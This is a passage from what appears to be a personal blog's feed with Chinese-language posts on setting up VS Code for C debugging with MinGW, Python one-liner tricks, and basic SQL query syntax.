world!/n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="4-配置导入的头文件参数-c-cpp-properties-json"><a href="#4-配置导入的头文件参数-c-cpp-properties-json" class="headerlink" title="4. 配置导入的头文件参数 c_cpp_properties.json"></a>4. 配置导入的头文件参数 c_cpp_properties.json</h2><p>在编写完毕并保存之后，你可能会看到 #include 这句下面会有绿色波浪线，这是由于编译器没办法找到你所使用的头文件的所在位置。将光标移动到该行，行号左边会出现 <code>黄色小灯泡</code> ，点击会出现一个提示按钮：<code>Add include path to setting</code> ，继续点击该提示，则会在工作区 <code>.vscode</code> 下生成 <code>c_cpp_properties.json</code> 文件。将文件修改成下面内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"Win32"</span>,</span><br><span class="line">            <span class="attr">"includePath"</span>: [</span><br><span class="line">                <span class="string">"$&#123;workspaceFolder&#125;/**"</span>,</span><br><span class="line">                <span class="comment">//改成自己位置!!!!!!</span></span><br><span class="line">                <span class="string">"D:\\mingw64\\x86_64-w64-mingw32\\include"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"defines"</span>: [</span><br><span class="line">                <span class="string">"_DEBUG"</span>,</span><br><span class="line">                <span class="string">"UNICODE"</span>,</span><br><span class="line">                <span class="string">"_UNICODE"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"compilerPath"</span>: <span class="string">"D:\\mingw64\\bin\\gcc.exe"</span>,</span><br><span class="line">            <span class="attr">"cStandard"</span>: <span class="string">"c11"</span>,</span><br><span class="line">            <span class="attr">"cppStandard"</span>: <span class="string">"c++17"</span>,</span><br><span class="line">            <span class="attr">"intelliSenseMode"</span>: <span class="string">"clang-x64"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"version"</span>: <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-配置调试程序-launch-json"><a href="#5-配置调试程序-launch-json" class="headerlink" title="5. 配置调试程序 launch.json"></a>5. 配置调试程序 launch.json</h2><p>打开已经编写好的 hello.c ，然后按 <code>F5</code> 调试。因为是第一次调试，系统会弹出 <code>选择环境</code> 面板，这里选择 <code>C++(GDB/LLDB)</code> 。</p><p><img src="2018-06-01_12-44-04.png" alt="2018-06-01_12-44-04"></p><p>选择运行环境后，VS Code 会在工作区 <code>.vscode</code> 文件夹下创建 <code>luanch.json</code> 模板文件并打开，将文件内容清空，复制下面的内容到文件中并保存：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">    <span class="attr">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 配置 VS Code 调试行为：</span></span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"GDB Debug"</span>, <span class="comment">// 设置在启动配置下拉菜单中显示调试配置的名称。</span></span><br><span class="line">            <span class="attr">"preLaunchTask"</span>: <span class="string">"Compile"</span>, <span class="comment">// 调试会话开始前要运行的任务。</span></span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"cppdbg"</span>, <span class="comment">// 设置要使用的基础调试器。使用 GDB 或 LLDB 时必须是 cppdbg 。</span></span><br><span class="line">            <span class="attr">"request"</span>: <span class="string">"launch"</span>, <span class="comment">// 设置启动程序还是附加到已经运行的实例。启动或附加 ( launch | attach ).</span></span><br><span class="line">            <span class="attr">"program"</span>: <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span>, <span class="comment">// 调试器将启动或附加的可执行文件的完整路径。</span></span><br><span class="line">            <span class="attr">"externalConsole"</span>: <span class="literal">false</span>, <span class="comment">// 设置是否显示外部控制台。</span></span><br><span class="line">            <span class="attr">"logging"</span>: &#123; <span class="comment">// 用于确定应该将哪些类型的消息记录到调试控制台。</span></span><br><span class="line">                <span class="attr">"exceptions"</span>: <span class="literal">true</span>, <span class="comment">// 是否应将异常消息记录到调试控制台。默认为真。</span></span><br><span class="line">                <span class="attr">"moduleLoad"</span>: <span class="literal">false</span>, <span class="comment">// 是否应将模块加载事件记录到调试控制台。默认为真。</span></span><br><span class="line">                <span class="attr">"programOutput"</span>: <span class="literal">true</span>, <span class="comment">// 是否应将程序输出记录到调试控制台的可选标志。默认为真。</span></span><br><span class="line">                <span class="attr">"engineLogging"</span>: <span class="literal">false</span>, <span class="comment">// 是否应将诊断引擎日志记录到调试控制台。默认为假。</span></span><br><span class="line">                <span class="attr">"trace"</span>: <span class="literal">false</span>, <span class="comment">// 是否将诊断适配器命令跟踪记录到调试控制台。默认为假。</span></span><br><span class="line">                <span class="attr">"traceResponse"</span>: <span class="literal">false</span> <span class="comment">// 是否将诊断适配器命令和响应跟踪记录到调试控制台。默认为假。</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 配置目标应用程序：</span></span><br><span class="line">            <span class="attr">"args"</span>: [], <span class="comment">// 设置调试时传递给程序的命令行参数。</span></span><br><span class="line">            <span class="attr">"cwd"</span>: <span class="string">"$&#123;workspaceFolder&#125;"</span>, <span class="comment">// 设置调试器启动的应用程序的工作目录。</span></span><br><span class="line">            <span class="attr">"environment"</span>: [], <span class="comment">// 设置调试时添加到程序环境中的环境变量，例如: [ &#123; "name": "squid", "value": "clam" &#125; ]。</span></span><br><span class="line">            <span class="comment">// 自定义 GDB 或者 LLDB：</span></span><br><span class="line">            <span class="attr">"windows"</span>: &#123;</span><br><span class="line">                <span class="attr">"MIMode"</span>: <span class="string">"gdb"</span>, <span class="comment">// 指定 VS Code 连接的调试器，必须为 gdb 或者 lldb。</span></span><br><span class="line">                <span class="attr">"miDebuggerPath"</span>: <span class="string">"D:\\mingw64\\bin\\gdb.exe"</span> <span class="comment">// 调试器的路径，修改为你的安装路径</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"miDebuggerArgs"</span>: <span class="string">""</span>, <span class="comment">// 传递给调试器的附加参数</span></span><br><span class="line">            <span class="attr">"stopAtEntry"</span>: <span class="literal">false</span>, <span class="comment">// 设置调试器是否停止在目标的入口（附加时忽略）。默认值为 false。</span></span><br><span class="line">            <span class="attr">"setupCommands"</span>: [</span><br><span class="line">                &#123; <span class="comment">// 执行下面的命令数组以设置 GDB 或 LLDB</span></span><br><span class="line">                    <span class="attr">"description"</span>: <span class="string">"Enable pretty-printing for gdb"</span>,</span><br><span class="line">                    <span class="attr">"text"</span>: <span class="string">"-enable-pretty-printing"</span>, <span class="comment">// 鼠标悬停查看变量的值，需要启用 pretty-printing 。</span></span><br><span class="line">                    <span class="attr">"ignoreFailures"</span>: <span class="literal">true</span> <span class="comment">// 忽略失败的命令，默认为 false 。</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>留意</strong> <code>luanch.json</code> <strong>中注释内容</strong>，记得把 “miDebuggerPath” 参数修改成你自己安装位置里的 <code>gdb.exe</code></p><p><code>gdb.exe</code> 位于 <code>{MinGW-w64安装位置}\mingw64\bin</code> 下面。</p><p>==注意!!!==</p><p><code>&quot;externalConsole&quot;: false, // 设置是否显示外部控制台。</code></p><p>这段配置,我在网上搜索的时候,无一例外都是改成true的</p><p>true—-&gt;像是在dev啊,vs啊之类的,会弹出一个黑色的框,用来互交,输出</p><p>false—-&gt;在终端中显示出来</p><p>本来我也是改成true的,但是弹框总是会闪退,查了很久所有解决办法都试过了,但是没法解决,能力有限</p><p>所以就改成false了,意外的好用.互交,输出都在终端中进行,如下图</p><p><img src="Snipaste_2020-03-02_13-19-52.png" alt="Snipaste_2020-03-02_13-19-52"></p><h2 id="6-配置调试前执行的任务-task-json"><a href="#6-配置调试前执行的任务-task-json" class="headerlink" title="6. 配置调试前执行的任务 task.json"></a>6. 配置调试前执行的任务 task.json</h2><p>再按一次 <code>F5</code> ，会弹出“找不到任务”的提示窗口，点击 <code>配置任务</code> 按钮，如下图所示：</p><p><img src="2018-06-01_12-44-05.png" alt="2018-06-01_12-44-05"></p><p>然后在弹出的命令面板选择 <code>使用模板创建 task.json 文件</code> ，如下图所示：</p><p><img src="2018-06-01_12-44-06.png" alt="2018-06-01_12-44-06"></p><p>继续选择 <code>Others 运行任意外部命令的示例</code> ，如下图所示：</p><p><img src="2018-06-01_12-44-07.png" alt="2018-06-01_12-44-07"></p><p>完成以上步骤之后，会在工作区的 <code>.vscode</code> 目录下生成 <code>tasks.json</code> 文件，并自动打开 <code>task.json</code> 文件。</p><p><img src="2018-06-01_12-44-08.png" alt="2018-06-01_12-44-08"></p><p>接下来我们将 <code>task.json</code> 文件内容清空，复制下面的内容到文件中并保存：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 有关 tasks.json 格式的参考文档：https://go.microsoft.com/fwlink/?LinkId=733558 。</span></span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"2.0.0"</span>,</span><br><span class="line">    <span class="attr">"tasks"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"Compile"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"windows"</span>: &#123;</span><br><span class="line">                <span class="attr">"command"</span>: <span class="string">"gcc"</span>,</span><br><span class="line">                <span class="attr">"args"</span>: [</span><br><span class="line">                    <span class="string">"-g"</span>,</span><br><span class="line">                    <span class="string">"\"$&#123;file&#125;\""</span>,</span><br><span class="line">                    <span class="string">"-o"</span>,</span><br><span class="line">                    <span class="string">"\"$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe\""</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"group"</span>: &#123;</span><br><span class="line">                <span class="attr">"kind"</span>: <span class="string">"build"</span>,</span><br><span class="line">                <span class="attr">"isDefault"</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"presentation"</span>: &#123;</span><br><span class="line">                <span class="attr">"reveal"</span>: <span class="string">"silent"</span>,</span><br><span class="line">                <span class="attr">"focus"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"echo"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"panel"</span>: <span class="string">"dedicated"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"problemMatcher"</span>: &#123;</span><br><span class="line">                <span class="attr">"owner"</span>: <span class="string">"cpp"</span>,</span><br><span class="line">                <span class="attr">"fileLocation"</span>: [</span><br><span class="line">                    <span class="string">"relative"</span>,</span><br><span class="line">                    <span class="string">"$&#123;workspaceFolder&#125;"</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">"pattern"</span>: &#123;</span><br><span class="line">                    <span class="attr">"regexp"</span>: <span class="string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span>,</span><br><span class="line">                    <span class="attr">"file"</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="attr">"line"</span>: <span class="number">2</span>,</span><br><span class="line">                    <span class="attr">"column"</span>: <span class="number">3</span>,</span><br><span class="line">                    <span class="attr">"severity"</span>: <span class="number">4</span>,</span><br><span class="line">                    <span class="attr">"message"</span>: <span class="number">5</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"gcc.exe build active file"</span>,</span><br><span class="line">            <span class="attr">"command"</span>: <span class="string">"D:\\mingw64\\bin\\gcc.exe"</span>,</span><br><span class="line">            <span class="attr">"args"</span>: [</span><br><span class="line">                <span class="string">"-g"</span>,</span><br><span class="line">                <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">                <span class="string">"-o"</span>,</span><br><span class="line">                <span class="string">"$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"options"</span>: &#123;</span><br><span class="line">                <span class="attr">"cwd"</span>: <span class="string">"D:\\mingw64\\bin"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"problemMatcher"</span>: [</span><br><span class="line">                <span class="string">"$gcc"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"group"</span>: <span class="string">"build"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-ojbk"><a href="#7-ojbk" class="headerlink" title="7. ojbk"></a>7. ojbk</h2><p>回到hello.c,重新按下F5,yeah!!!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;vscode配置c&quot;&gt;&lt;a href=&quot;#vscode配置c&quot; class=&quot;headerlink&quot; title=&quot;vscode配置c&quot;&gt;&lt;/a&gt;vscode配置c&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="vscode" scheme="https://mercer5.github.io/categories/vscode/"/>
    
    
      <category term="vscode" scheme="https://mercer5.github.io/tags/vscode/"/>
    
      <category term="c" scheme="https://mercer5.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>python-一行代码</title>
    <link href="https://mercer5.github.io/2020/02/13/python-%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81/"/>
    <id>https://mercer5.github.io/2020/02/13/python-%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81/</id>
    <published>2020-02-13T12:39:45.000Z</published>
    <updated>2020-08-24T15:30:09.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一行代码python"><a href="#一行代码python" class="headerlink" title="一行代码python"></a>一行代码python</h1><h2 id="1-100-的和"><a href="#1-100-的和" class="headerlink" title="1 - 100 的和"></a>1 - 100 的和</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum(range(<span class="number">1</span>,<span class="number">101</span>))</span><br></pre></td></tr></table></figure><h2 id="数值交换"><a href="#数值交换" class="headerlink" title="数值交换"></a>数值交换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a,b=b,a</span><br></pre></td></tr></table></figure><h2 id="奇偶数"><a href="#奇偶数" class="headerlink" title="奇偶数"></a>奇偶数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">0</span>]</span><br><span class="line"><span class="comment">#[0, 2, 4, 6, 8]</span></span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>) <span class="keyword">if</span> x%<span class="number">2</span>==<span class="number">1</span>]</span><br><span class="line"><span class="comment">#[1, 3, 5, 7, 9]</span></span><br></pre></td></tr></table></figure><h2 id="展开列表"><a href="#展开列表" class="headerlink" title="展开列表"></a>展开列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst=[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]]</span><br><span class="line">[x <span class="keyword">for</span> y <span class="keyword">in</span> lst <span class="keyword">for</span> x <span class="keyword">in</span> y]</span><br><span class="line"><span class="comment">#[1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br></pre></td></tr></table></figure><h2 id="打乱列表"><a href="#打乱列表" class="headerlink" title="打乱列表"></a>打乱列表</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">lst=list(range(<span class="number">10</span>))</span><br><span class="line">random.shuffle(lst)</span><br><span class="line">lst</span><br></pre></td></tr></table></figure><h2 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"asdfghjkl"</span></span><br><span class="line">s[::<span class="number">-1</span>]</span><br><span class="line"><span class="comment">#'lkjhgfdsa'</span></span><br></pre></td></tr></table></figure><h2 id="查看目录下所有文件"><a href="#查看目录下所有文件" class="headerlink" title="查看目录下所有文件"></a><strong>查看目录下所有文件</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.listdir()</span><br></pre></td></tr></table></figure><h2 id="去除字符串间的空格"><a href="#去除字符串间的空格" class="headerlink" title="去除字符串间的空格"></a><strong>去除字符串间的空格</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"my name is mercer"</span></span><br><span class="line">s.replace(<span class="string">" "</span>,<span class="string">""</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"my name is mercer"</span></span><br><span class="line"><span class="string">""</span>.join(s.split())</span><br></pre></td></tr></table></figure><h2 id="字符串整数列表变成整数列表"><a href="#字符串整数列表变成整数列表" class="headerlink" title="字符串整数列表变成整数列表"></a><strong>字符串整数列表变成整数列表</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>]</span><br><span class="line">list(map(<span class="keyword">lambda</span> x: int(x),a))</span><br><span class="line"><span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure><h2 id="删除列表中重复的值"><a href="#删除列表中重复的值" class="headerlink" title="删除列表中重复的值"></a><strong>删除列表中重复的值</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">list(set(lst))</span><br><span class="line"><span class="comment">#[1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure><h2 id="9-9-乘法表"><a href="#9-9-乘法表" class="headerlink" title="9 * 9 乘法表"></a><strong>9 * 9 乘法表</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'\n'</span>.join([<span class="string">'\t'</span>.join([<span class="string">"%2s*%2s=%2s"</span>%(j,i,i*j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>)]))</span><br></pre></td></tr></table></figure><h2 id="两个列表中相同的元素"><a href="#两个列表中相同的元素" class="headerlink" title="两个列表中相同的元素"></a>两个列表中相同的元素</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">set(a)&amp;set(b)</span><br><span class="line"><span class="comment">#&#123;3, 4&#125;</span></span><br></pre></td></tr></table></figure><h2 id="两个列表中不同的元素"><a href="#两个列表中不同的元素" class="headerlink" title="两个列表中不同的元素"></a><strong>两个列表中不同的元素</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">set(a)^set(b)</span><br><span class="line"><span class="comment">#&#123;1, 2, 5, 6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="合并两个字典"><a href="#合并两个字典" class="headerlink" title="合并两个字典"></a><strong>合并两个字典</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">"name"</span>:<span class="string">"mercer"</span>&#125;</span><br><span class="line">b=&#123;<span class="string">"age"</span>:<span class="string">"100"</span>&#125;</span><br><span class="line">a.update(b)</span><br><span class="line">a</span><br><span class="line"><span class="comment">#&#123;'name': 'mercer', 'age': '100'&#125;</span></span><br></pre></td></tr></table></figure><h2 id="字典键从小到大排序"><a href="#字典键从小到大排序" class="headerlink" title="字典键从小到大排序"></a><strong>字典键从小到大排序</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">"name"</span>:<span class="string">"mercer"</span>,<span class="string">"age"</span>:<span class="number">100</span>,<span class="string">"like"</span>:<span class="string">"python"</span>&#125;</span><br><span class="line">sorted(a.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#[('age', 100), ('like', 'python'), ('name', 'mercer')]</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一行代码python&quot;&gt;&lt;a href=&quot;#一行代码python&quot; class=&quot;headerlink&quot; title=&quot;一行代码python&quot;&gt;&lt;/a&gt;一行代码python&lt;/h1&gt;&lt;h2 id=&quot;1-100-的和&quot;&gt;&lt;a href=&quot;#1-100-的和&quot; cla
      
    
    </summary>
    
    
      <category term="python" scheme="https://mercer5.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://mercer5.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>sql-wp</title>
    <link href="https://mercer5.github.io/2020/02/13/sql-wp/"/>
    <id>https://mercer5.github.io/2020/02/13/sql-wp/</id>
    <published>2020-02-13T12:39:04.000Z</published>
    <updated>2020-08-24T15:30:09.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql-wp"><a href="#sql-wp" class="headerlink" title="sql wp"></a>sql wp</h1><h2 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h2><p><a href="http://xuesql.cn/" target="_blank" rel="noopener">http://xuesql.cn/</a></p><h2 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h2><p>服务SELECT查询语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, another_column, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> condition(s)</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span> <span class="keyword">ASC</span>/<span class="keyword">DESC</span> </span><br><span class="line"><span class="keyword">LIMIT</span> num_limit <span class="keyword">OFFSET</span> num_offset;</span><br></pre></td></tr></table></figure><p>用INNER JOIN 连接表的语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, another_table_column, … </span><br><span class="line"><span class="keyword">FROM</span> mytable （主表） </span><br><span class="line"><span class="keyword">INNER</span>/<span class="keyword">LEFT</span>/<span class="keyword">RIGHT</span>/<span class="keyword">FULL</span> <span class="keyword">JOIN</span> another_table （要连接的表）    </span><br><span class="line"><span class="keyword">ON</span> mytable.id = another_table.id (主键连接，两个相同的连成<span class="number">1</span>条) </span><br><span class="line"><span class="keyword">WHERE</span> condition(s) </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span>, … <span class="keyword">ASC</span>/<span class="keyword">DESC</span> </span><br><span class="line"><span class="keyword">LIMIT</span> num_limit <span class="keyword">OFFSET</span> num_offset;</span><br></pre></td></tr></table></figure><p>在查询条件中处理 NULL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span>, another_column, … </span><br><span class="line"><span class="keyword">FROM</span> mytable </span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">IS</span>/<span class="keyword">IS</span> <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line"><span class="keyword">AND</span>/<span class="keyword">OR</span> another_condition </span><br><span class="line"><span class="keyword">AND</span>/<span class="keyword">OR</span> …;</span><br></pre></td></tr></table></figure><p>属性列和表取别名的例子</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span> <span class="keyword">AS</span> better_column_name, … </span><br><span class="line"><span class="keyword">FROM</span> a_long_widgets_table_name <span class="keyword">AS</span> mywidgets 